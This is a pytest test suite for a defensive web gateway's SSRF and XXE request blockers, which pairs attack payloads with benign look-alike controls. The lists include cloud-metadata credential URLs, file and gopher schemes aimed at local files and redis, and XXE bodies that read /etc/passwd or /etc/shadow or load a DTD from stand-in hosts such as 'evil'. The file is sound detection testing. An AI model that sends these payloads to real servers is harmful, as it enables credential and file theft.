"""
Request-side SSRF / XXE blocks — the AEGIS ``ssrf_attempt`` and ``xxe_attempt`` classes.

The request-side siblings of ``sqli_attempt`` / ``path_traversal_attempt``, and the BLOCK-worthy
UNAMBIGUOUS subset of the existing SSRF/XXE LEADs. Judged on the request VALUE/BODY ALONE (offline, no
DNS/network), each proves a STRUCTURED ATTEMPT — NOT a dereference/exploitation:

  * ``ssrf_attempt`` fires iff a value parses (urlsplit, after a defensive decode) to a URL whose HOST is a
    cloud-metadata endpoint (169.254.169.254, [fd00:ec2::254], metadata.google.internal, 100.100.100.200,
    169.254.170.2) OR whose SCHEME is a dangerous non-HTTP protocol (file/gopher/dict/ftp/tftp/ldap/jar/
    netdoc/expect). A general internal/RFC1918/loopback http(s) URL (a benign internal-webhook shape) does
    NOT fire — it stays the existing LEAD.
  * ``xxe_attempt`` fires iff the request BODY declares a COMPLETE external (SYSTEM/PUBLIC) entity inside a
    DOCTYPE internal subset. A normal SOAP/XML body, a bare ``<!DOCTYPE html>``, an internal-entity-only DTD,
    and prose discussing XXE all stay inert; a truncated declaration stays the existing LEAD.

DEFENSIVE: the failure mode is a FALSE BLOCK of benign traffic, so soundness = near-zero false positives.
The decisive, SAME-SHAPE benign negative controls below (a general internal URL for SSRF; an
internal-entity-only DTD for XXE) MUST all stay clean; only the unambiguous constructs fire.

Covered here:
  * the attack forms FIRE at/above the confirm threshold and are block-eligible (every metadata host, every
    dangerous scheme, a SYSTEM file:// and a PUBLIC external-entity DOCTYPE; over the param / body surfaces);
  * every benign negative control does NOT fire — including the decisive same-shape twins;
  * the gateway inspector BLOCKS a confirmed attempt (certificate attached) and FORWARDS benign traffic;
  * the certificate re-verifies OFFLINE, a tampered certificate does not, and a relabelled certificate
    (claimed as the response-side/OOB ``ssrf``/``xxe`` or a sibling request class) is refused;
  * end-to-end over real sockets: 403 + ``X-Aegis-Block: ssrf_attempt|xxe_attempt`` + a re-runnable cert for
    the attack, and a transparent 200 forward for a benign internal-webhook URL and a benign XML body;
  * the softer SSRF/XXE cases still emit the existing LEAD (the request-side block did NOT delete them).
"""

from __future__ import annotations

import http.server
import socketserver
import threading
import urllib.error
import urllib.parse
import urllib.request
from collections.abc import Iterator

import pytest

from framework.v2.aegis.gateway import serve_gateway
from framework.v2.aegis.inspect import inspect_request
from framework.v2.aegis.models import AegisConfig, Verdict
from framework.v2.verify.oracles import ssrf_breakout_oracle, xxe_breakout_oracle
from framework.v2.verify.reverify import reverify_context
from framework.v2.verify.verifier import HIGH_CONFIDENCE

_XML = [("Content-Type", "application/xml")]

# --------------------------------------------------------------------------- corpora

# SSRF ATTACK forms — an unambiguous cloud-metadata host OR a dangerous non-HTTP scheme. Each MUST fire +
# confirm + be block-eligible. Encoded + @-userinfo + IPv6 variants are here because defeating them is the
# point of the decode / urlsplit discipline.
SSRF_ATTACK_FORMS = [
    "http://169.254.169.254/latest/meta-data/",          # AWS/Azure/GCP IMDS
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://[fd00:ec2::254]/latest/meta-data/",          # AWS IMDS over IPv6
    "http://metadata.google.internal/computeMetadata/v1/",  # GCP
    "http://100.100.100.200/latest/meta-data/",          # Alibaba
    "http://169.254.170.2/v2/credentials/",              # AWS ECS task metadata
    "http%3A%2F%2F169.254.169.254%2Flatest",             # fully percent-encoded
    "http://expected-host@169.254.169.254/latest",       # @-userinfo trick -> host is still the IMDS IP
    "file:///etc/passwd",                                # dangerous scheme (file read)
    "gopher://127.0.0.1:6379/_INFO",                     # gopher -> redis
    "dict://localhost:11211/stat",                       # dict -> memcached
    "jar:file:///etc/passwd",
    "netdoc:///etc/passwd",
    "expect://id",
]

# SSRF BENIGN controls (same shape — a URL and/or a sensitive-looking host — but NOT the unambiguous block
# subset). Each MUST stay clean. The DECISIVE same-shape twin is the general internal/RFC1918 webhook URL.
SSRF_BENIGN = [
    # (a) a general internal / RFC1918 / loopback http(s) URL — a benign internal-webhook shape (the KEY twin)
    "http://10.0.0.5/internal-webhook",
    "https://localhost:3000/health",
    "http://192.168.1.10/api",
    "http://127.0.0.1:8080/admin",
    "https://10.0.0.5/internal",
    "http://172.16.0.9/metrics",
    # (a') dangerous-scheme fetches real apps legitimately make (ftp mirrors, tftp firmware, ldap lookups) —
    #      EXCLUDED from the block set, so the oracle must NOT fire; they stay the softer inspect LEAD.
    "ftp://internal.host/secret",
    "tftp://10.0.0.1/boot",
    "ldap://10.0.0.1/o=x",
    # (b) a legitimate external API / asset
    "https://api.github.com/x",
    "https://api.stripe.com/v1/charges",
    "https://cdn.example.com/logo.png",
    # (c) a bare metadata IP with NO scheme/url-context (must appear as a URL host, not a prose substring)
    "169.254.169.254",
    "169.254.169.254:80/latest",
    # (d) a metadata/scheme LOOKALIKE the exact-host / start-anchored test does not confirm
    "http://169.254.169.254.evil.com/",                  # host is a lookalike, not the IMDS IP
    "https://metadata.google.internal.attacker.net/",    # host is a lookalike
    "x file:///etc/passwd",                              # scheme not at the value start -> prose-ish
    # (e) prose merely mentioning a dangerous scheme
    "please avoid file:// in production configs",
    "you can use gopher:// to reach redis",
    # (f) not a URL at all
    "just some search text",
    "8.8.8.8",
]

# XXE ATTACK forms — a COMPLETE external (SYSTEM/PUBLIC) entity declaration in a DOCTYPE internal subset.
XXE_ATTACK_FORMS = [
    '<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><foo>&xxe;</foo>',
    '<!DOCTYPE r [ <!ENTITY e PUBLIC "-//x//y" "http://evil/x.dtd"> ]><r>&e;</r>',
    '<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://collab.example/x.dtd"> ]><foo>&xxe;</foo>',
    '<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://evil/evil.dtd"> %xxe; ]>',   # parameter entity
    '<!DOCTYPE data SYSTEM "x" [ <!ENTITY e SYSTEM "file:///etc/shadow"> ]><data>&e;</data>',
]

# XXE BENIGN controls — benign XML with NO external-entity declaration. Each MUST stay clean. The DECISIVE
# same-shape twin is the internal-entity-only DTD (an <!ENTITY> that is NOT SYSTEM/PUBLIC).
XXE_BENIGN = [
    '<?xml version="1.0"?><soap:Envelope><soap:Body><getUser>bob</getUser></soap:Body></soap:Envelope>',
    '<note><to>bob</to><body>hi</body></note>',
    '<!DOCTYPE html><html><body>ordinary doctype, no entity</body></html>',
    # the KEY same-shape twin: an internal-subset DTD with only LITERAL entities (no SYSTEM/PUBLIC)
    '<!DOCTYPE r [ <!ENTITY a "hello"> ]><r>&a;</r>',
    '<!DOCTYPE r [ <!ENTITY copyright "(c) 2026"> <!ENTITY company "Acme"> ]><r>&company;</r>',
    # prose / paste merely MENTIONING the concepts (no <!...> markup)
    "XXE works by declaring a DOCTYPE with an external ENTITY using SYSTEM or PUBLIC to read local files.",
    "Our API rejects any request whose body contains a DOCTYPE or ENTITY declaration.",
]


# --------------------------------------------------------------------------- oracle-level (pure)

@pytest.mark.parametrize("payload", SSRF_ATTACK_FORMS)
def test_ssrf_attack_forms_fire_and_are_block_eligible(payload):
    sig = ssrf_breakout_oracle(payload, param="url")
    assert sig.fired is True, f"SSRF attack did not fire: {payload!r}"
    assert sig.confidence >= HIGH_CONFIDENCE, f"below confirm threshold: {payload!r} -> {sig.confidence}"
    assert sig.conclusive is True
    assert sig.observed.get("break_out") is True
    assert sig.observed.get("ssrf_vector") in {"cloud_metadata", "dangerous_scheme"}


@pytest.mark.parametrize("payload", SSRF_BENIGN)
def test_ssrf_benign_controls_do_not_fire(payload):
    """The decisive, same-shape negatives. If ANY of these fires it is a blocking FP — fail loudly."""
    sig = ssrf_breakout_oracle(payload, param="url")
    assert sig.fired is False, f"SSRF BENIGN FALSE POSITIVE: {payload!r} fired ({sig.evidence})"
    assert sig.confidence == 0.0


@pytest.mark.parametrize("payload", XXE_ATTACK_FORMS)
def test_xxe_attack_forms_fire_and_are_block_eligible(payload):
    sig = xxe_breakout_oracle(payload, param="body")
    assert sig.fired is True, f"XXE attack did not fire: {payload!r}"
    assert sig.confidence >= HIGH_CONFIDENCE, f"below confirm threshold: {payload!r} -> {sig.confidence}"
    assert sig.conclusive is True
    assert sig.observed.get("break_out") is True
    assert sig.observed.get("entity_construct"), f"no entity construct recorded for {payload!r}"


@pytest.mark.parametrize("payload", XXE_BENIGN)
def test_xxe_benign_controls_do_not_fire(payload):
    """The decisive, same-shape negatives (notably the internal-entity-only DTD). A fire here is a blocking
    FP — fail loudly."""
    sig = xxe_breakout_oracle(payload, param="body")
    assert sig.fired is False, f"XXE BENIGN FALSE POSITIVE: {payload!r} fired ({sig.evidence})"
    assert sig.confidence == 0.0


def test_oracles_are_pure_and_deterministic():
    for p in SSRF_ATTACK_FORMS + SSRF_BENIGN:
        a, b = ssrf_breakout_oracle(p, param="url"), ssrf_breakout_oracle(p, param="url")
        assert (a.fired, a.confidence, a.observed.get("ssrf_vector")) == \
               (b.fired, b.confidence, b.observed.get("ssrf_vector"))
    for p in XXE_ATTACK_FORMS + XXE_BENIGN:
        a, b = xxe_breakout_oracle(p, param="body"), xxe_breakout_oracle(p, param="body")
        assert (a.fired, a.confidence) == (b.fired, b.confidence)


def test_non_string_and_empty_payloads_are_inert():
    for p in (None, 123, "", "http", "<x/>", ".."):
        assert ssrf_breakout_oracle(p, param="url").fired is False
        assert xxe_breakout_oracle(p, param="body").fired is False


def test_truncated_external_entity_does_not_block_at_oracle_level():
    """A truncated/unclosed external-entity declaration is NOT a block (it stays the LEAD) — the oracle's
    complete-construct requirement keeps the block to the unambiguous form."""
    sig = xxe_breakout_oracle('<!DOCTYPE foo [ <!ENTITY xxe SYSTEM', param="body")
    assert sig.fired is False


# --------------------------------------------------------------------------- gateway inspector (unit)

def _q(name, value):
    return "/fetch?" + name + "=" + urllib.parse.quote(value, safe="")


def _req(path="/", headers=None, body=None, enforce=True):
    return inspect_request("GET", path, headers or [], body, enforce=enforce)


def test_inspector_blocks_ssrf_metadata_query_param_with_certificate():
    v = _req(path=_q("url", "http://169.254.169.254/latest/meta-data/"))
    assert v is not None and v.decision == "confirmed" and v.attack_class == "ssrf_attempt"
    assert v.action == "block" and v.confidence >= HIGH_CONFIDENCE
    assert v.contributing == ["url"]
    assert v.certificate is not None and v.certificate.reverify() is True


def test_inspector_blocks_ssrf_dangerous_scheme_query_param():
    v = _req(path=_q("next", "file:///etc/passwd"))
    assert v is not None and v.attack_class == "ssrf_attempt" and v.contributing == ["next"]
    assert v.certificate.reverify() is True


def test_inspector_blocks_ssrf_in_a_form_body():
    body = "cb=" + urllib.parse.quote("gopher://127.0.0.1:6379/_INFO")
    v = inspect_request("POST", "/hook", [("Content-Type", "application/x-www-form-urlencoded")], body)
    assert v is not None and v.attack_class == "ssrf_attempt" and v.contributing == ["cb"]
    assert v.certificate.reverify() is True


def test_inspector_blocks_xxe_body_with_certificate():
    body = '<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><foo>&xxe;</foo>'
    v = inspect_request("POST", "/upload", _XML, body, enforce=True)
    assert v is not None and v.decision == "confirmed" and v.attack_class == "xxe_attempt"
    assert v.action == "block" and v.contributing == ["body"]
    assert v.certificate is not None and v.certificate.reverify() is True


def test_inspector_observe_mode_confirms_but_does_not_block():
    v = _req(path=_q("url", "http://169.254.169.254/latest/"), enforce=False)
    assert v is not None and v.decision == "confirmed" and v.action == "observe"
    assert v.certificate is not None


@pytest.mark.parametrize("payload", SSRF_BENIGN)
def test_inspector_never_ssrf_blocks_a_benign_value(payload):
    """A benign SSRF control through the inspector never produces an ssrf_attempt BLOCK. (A general
    internal URL may still be an SSRF LEAD, which never blocks.)"""
    v = _req(path=_q("url", payload))
    if v is not None:
        assert not (v.decision == "confirmed" and v.attack_class == "ssrf_attempt"), \
            f"BENIGN FALSE BLOCK: {payload!r} -> {v}"
        assert v.action != "block"


@pytest.mark.parametrize("payload", XXE_BENIGN)
def test_inspector_never_xxe_blocks_a_benign_body(payload):
    v = inspect_request("POST", "/upload", _XML, payload, enforce=True)
    if v is not None:
        assert not (v.decision == "confirmed" and v.attack_class == "xxe_attempt"), \
            f"BENIGN FALSE BLOCK: {payload!r} -> {v}"


# --------------------------------------------------------------------------- the softer cases STAY LEADs

@pytest.mark.parametrize("value", [
    "http://10.0.0.5/internal-webhook",
    "https://localhost:3000/health",
    "http://192.168.1.10/api",
    "http://127.0.0.1:8080/admin",
    "http://169.254.169.254.evil.com/",   # a metadata lookalike the block did not confirm
])
def test_softer_internal_ssrf_still_emits_the_lead(value):
    """The request-side block did NOT delete the SSRF LEAD: the softer internal/RFC1918/loopback/lookalike
    URL still raises a LEAD (belief-raising, observe, no certificate), never a block."""
    v = _req(path=_q("url", value))
    assert v is not None and v.decision == "lead" and v.attack_class == "ssrf"
    assert v.action == "observe" and v.certificate is None


def test_truncated_xxe_still_emits_the_lead():
    """A truncated/unclosed external-entity declaration still raises the XXE LEAD (not a block)."""
    v = inspect_request("POST", "/upload", _XML, '<?xml?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM', enforce=True)
    assert v is not None and v.decision == "lead" and v.attack_class == "xxe"
    assert v.action == "observe" and v.certificate is None


# --------------------------------------------------------------------------- certificate (offline)

def test_ssrf_certificate_contents_and_reverifies_offline():
    v = _req(path=_q("url", "http://169.254.169.254/latest/meta-data/"))
    oc = v.certificate.oracle_context
    assert oc["bug_class"] == "ssrf_attempt"
    assert oc["request_payload"] == "http://169.254.169.254/latest/meta-data/"
    assert oc["payload_param"] == "url"
    r = reverify_context(oc, bug_class=v.certificate.bug_class,
                         claimed_confirmed_by=v.certificate.confirmed_by,
                         claimed_confidence=v.certificate.confidence, verifier=None)
    assert r.ok and r.reproduced and r.matches_claim
    assert r.confirmed_by == "ssrf_breakout"
    assert v.certificate.reverify() is True


def test_xxe_certificate_contents_and_reverifies_offline():
    body = '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><foo>&xxe;</foo>'
    v = inspect_request("POST", "/upload", _XML, body)
    oc = v.certificate.oracle_context
    assert oc["bug_class"] == "xxe_attempt"
    assert oc["request_payload"] == body
    assert oc["payload_param"] == "body"
    r = reverify_context(oc, bug_class=v.certificate.bug_class,
                         claimed_confirmed_by=v.certificate.confirmed_by,
                         claimed_confidence=v.certificate.confidence, verifier=None)
    assert r.ok and r.reproduced and r.matches_claim
    assert r.confirmed_by == "xxe_breakout"
    assert v.certificate.reverify() is True


def test_tampered_certificates_do_not_reverify():
    v = _req(path=_q("url", "file:///etc/passwd"))
    t = dict(v.certificate.oracle_context)
    t["request_payload"] = "https://api.github.com/x"     # swap in a benign value
    assert not reverify_context(t, bug_class=v.certificate.bug_class, verifier=None).ok

    vb = inspect_request("POST", "/upload", _XML,
                         '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>')
    tb = dict(vb.certificate.oracle_context)
    tb["request_payload"] = '<!DOCTYPE r [ <!ENTITY a "hello"> ]>'   # benign internal-entity body
    assert not reverify_context(tb, bug_class=vb.certificate.bug_class, verifier=None).ok


def test_relabelled_certificates_are_refused():
    """An ssrf_attempt / xxe_attempt cert cannot be re-confirmed under a DIFFERENT class — neither the
    response-side/OOB ``ssrf``/``xxe`` (distinct dereference proofs) nor a sibling request class."""
    vs = _req(path=_q("url", "http://169.254.169.254/latest/"))
    for other in ("ssrf", "xxe_attempt", "sqli_attempt", "path_traversal_attempt"):
        assert not reverify_context(vs.certificate.oracle_context, bug_class=other, verifier=None).ok, \
            f"SSRF relabel to {other!r} must be refused"
    vx = inspect_request("POST", "/upload", _XML,
                         '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>')
    for other in ("xxe", "ssrf_attempt", "sqli_attempt", "command_injection_attempt"):
        assert not reverify_context(vx.certificate.oracle_context, bug_class=other, verifier=None).ok, \
            f"XXE relabel to {other!r} must be refused"


# --------------------------------------------------------------------------- end-to-end (real sockets)

class _Upstream(http.server.BaseHTTPRequestHandler):
    def log_message(self, *_a):
        return

    def _reply(self):
        body = f"UPSTREAM-OK path={self.path}".encode()
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        if self.command != "HEAD":
            self.wfile.write(body)

    do_GET = _reply
    do_POST = _reply


@pytest.fixture()
def upstream() -> Iterator[int]:
    srv = socketserver.TCPServer(("127.0.0.1", 0), _Upstream)
    srv.daemon_threads = True
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    try:
        yield srv.server_address[1]
    finally:
        srv.shutdown()
        srv.server_close()


def _run_gateway(upstream_port: int, *, mode: str, sink: list | None = None):
    cfg = AegisConfig(deployment_secret="k", mode=mode)
    gw = serve_gateway(f"http://127.0.0.1:{upstream_port}", config=cfg, host="127.0.0.1", port=0,
                       on_verdict=(sink.append if sink is not None else None))
    threading.Thread(target=gw.serve_forever, daemon=True).start()
    return gw, gw.server_address[1]


def _get(port: int, path: str):
    return urllib.request.urlopen(urllib.request.Request(f"http://127.0.0.1:{port}{path}"), timeout=5)


def _post_xml(port: int, body: str):
    req = urllib.request.Request(f"http://127.0.0.1:{port}/upload", data=body.encode(),
                                 headers={"Content-Type": "application/xml"}, method="POST")
    return urllib.request.urlopen(req, timeout=5)


_SSRF_ATTACK = "/fetch?url=" + urllib.parse.quote("http://169.254.169.254/latest/meta-data/")
_SSRF_BENIGN = "/fetch?url=" + urllib.parse.quote("http://10.0.0.5/internal-webhook")
_XXE_ATTACK = '<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><foo>&xxe;</foo>'
_XXE_BENIGN = '<?xml version="1.0"?><soap:Envelope><soap:Body><getUser>bob</getUser></soap:Body></soap:Envelope>'


def test_e2e_enforce_blocks_ssrf_metadata_with_403_and_certificate(upstream):
    sink: list[Verdict] = []
    gw, port = _run_gateway(upstream, mode="enforce", sink=sink)
    try:
        with pytest.raises(urllib.error.HTTPError) as ei:
            _get(port, _SSRF_ATTACK)
        err = ei.value
        assert err.code == 403
        assert err.headers.get("X-Aegis-Block") == "ssrf_attempt"
        assert err.headers.get("X-Aegis-Certificate", "").startswith("aegis-cert:")
        v = next(v for v in sink if v.decision == "confirmed")
        assert v.attack_class == "ssrf_attempt"
        assert v.certificate is not None and v.certificate.reverify() is True
    finally:
        gw.shutdown()


def test_e2e_enforce_blocks_xxe_external_entity_with_403_and_certificate(upstream):
    sink: list[Verdict] = []
    gw, port = _run_gateway(upstream, mode="enforce", sink=sink)
    try:
        with pytest.raises(urllib.error.HTTPError) as ei:
            _post_xml(port, _XXE_ATTACK)
        err = ei.value
        assert err.code == 403
        assert err.headers.get("X-Aegis-Block") == "xxe_attempt"
        assert err.headers.get("X-Aegis-Certificate", "").startswith("aegis-cert:")
        v = next(v for v in sink if v.decision == "confirmed")
        assert v.attack_class == "xxe_attempt"
        assert v.certificate is not None and v.certificate.reverify() is True
    finally:
        gw.shutdown()


def test_e2e_enforce_forwards_a_benign_internal_webhook_url(upstream):
    """A general internal-webhook URL is at most an SSRF LEAD (never a 403) — relayed untouched."""
    sink: list[Verdict] = []
    gw, port = _run_gateway(upstream, mode="enforce", sink=sink)
    try:
        body = _get(port, _SSRF_BENIGN).read().decode()
        assert "UPSTREAM-OK" in body                                   # forwarded, not blocked
        assert not any(v.decision == "confirmed" and v.attack_class == "ssrf_attempt" for v in sink)
    finally:
        gw.shutdown()


def test_e2e_enforce_forwards_benign_xml(upstream):
    gw, port = _run_gateway(upstream, mode="enforce")
    try:
        assert "UPSTREAM-OK" in _post_xml(port, _XXE_BENIGN).read().decode()
    finally:
        gw.shutdown()


def test_e2e_observe_mode_forwards_even_the_attacks(upstream):
    sink: list[Verdict] = []
    gw, port = _run_gateway(upstream, mode="observe", sink=sink)
    try:
        assert "UPSTREAM-OK" in _get(port, _SSRF_ATTACK).read().decode()
        assert "UPSTREAM-OK" in _post_xml(port, _XXE_ATTACK).read().decode()
        assert any(v.decision == "confirmed" and v.attack_class == "ssrf_attempt" for v in sink)
        assert any(v.decision == "confirmed" and v.attack_class == "xxe_attempt" for v in sink)
    finally:
        gw.shutdown()
